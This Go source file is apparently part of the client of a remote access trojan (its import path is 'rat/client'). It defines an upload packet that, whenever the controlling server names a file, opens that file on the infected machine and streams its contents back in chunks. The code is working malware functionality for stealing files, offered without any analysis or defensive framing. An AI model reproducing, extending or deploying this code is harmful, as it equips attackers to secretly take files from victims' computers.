package main

import (
	"fmt"
	"io"
	"os"

	"rat/client/network/header"

	"gopkg.in/mgo.v2/bson"
)

type UploadPacket struct {
	File  string `network:"send,receive"`
	Total int64  `network:"send"`
	Final bool   `network:"send"`
	Data  []byte `network:"send"`
}

func (packet UploadPacket) Header() header.PacketHeader {
	return header.DownloadToServerHeader
}

func (packet *UploadPacket) Init() {

}

func (packet UploadPacket) OnReceive() error {
	go func() {
		final := false
		local, err := os.Open(packet.File)
		defer local.Close()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		stat, err := local.Stat()
		if err != nil {
			fmt.Println(err.Error())
			return
		}

		for !final {
			data := make([]byte, TransferPacketSize)

			read, err := local.Read(data)
			if err == io.EOF {
				final = true
			} else if err != nil {
				fmt.Println(err.Error())
				return
			}
			Queue <- &UploadPacket{packet.File, stat.Size(), final, data[:read]}
		}
	}()

	return nil
}

func (packet UploadPacket) Decode(buf []byte) (IncomingPacket, error) {
	err := bson.Unmarshal(buf, &packet)
	return packet, err
}
